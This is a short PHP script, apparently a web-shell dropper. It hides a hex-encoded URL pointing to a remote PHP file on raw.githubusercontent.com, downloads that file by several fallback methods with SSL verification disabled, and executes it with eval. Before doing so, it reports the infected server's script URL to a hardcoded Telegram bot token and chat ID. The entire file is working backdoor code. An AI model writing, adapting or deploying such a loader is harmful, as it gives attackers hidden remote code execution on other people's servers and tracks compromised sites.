<?php

$kitabisacom1337 = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6b69746162697361636f6d313333372f446566656e642f726566732f68656164732f6d61696e2f312e706870';

function root($hex) {
    return implode('', array_map('chr', array_map('hexdec', str_split($hex, 2))));
}

$url = root($kitabisacom1337);

function download($url) {
    if (ini_get('allow_url_fopen')) {
        return file_get_contents($url);
    } elseif (function_exists('curl_version')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    } else {
        $fp = @fopen($url, 'r');
        if ($fp) {
            $result = '';
            while ($data = fread($fp, 8192)) {
                $result .= $data;
            }
            fclose($fp);
            return $result;
        }
    }
    return false;
}

function sendToTelegram($message) {
    static $alreadySentMessages = [];

    if (in_array($message, $alreadySentMessages)) {
        return;
    }

    $botToken = '7132923060:AAFEoSvpWMvHFUYgeSeA_8WDCwRjPEpk4ok'; // Ganti dengan token bot Telegram Anda
    $chatId = '1345261884';     // Ganti dengan chat ID Anda

    $url = "https://api.telegram.org/bot$botToken/sendMessage";

    $data = [
        'chat_id' => $chatId,
        'text' => $message
    ];

    if (function_exists('curl_version')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_exec($ch);
        curl_close($ch);
    } else {
        $options = [
            'http' => [
                'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
                'method'  => 'POST',
                'content' => http_build_query($data),
            ],
        ];
        $context  = stream_context_create($options);
        file_get_contents($url, false, $context);
    }

    $alreadySentMessages[] = $message;
}

// Kirim URL file PHP ke Telegram
$fileUrl = (isset($_SERVER['HTTPS']) ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
sendToTelegram("Script URL: $fileUrl");

$phpScript = download($url);

if ($phpScript === false) {
    die("Gagal mendownload script PHP dari URL dengan semua metode.");
}

eval('?>' . $phpScript);
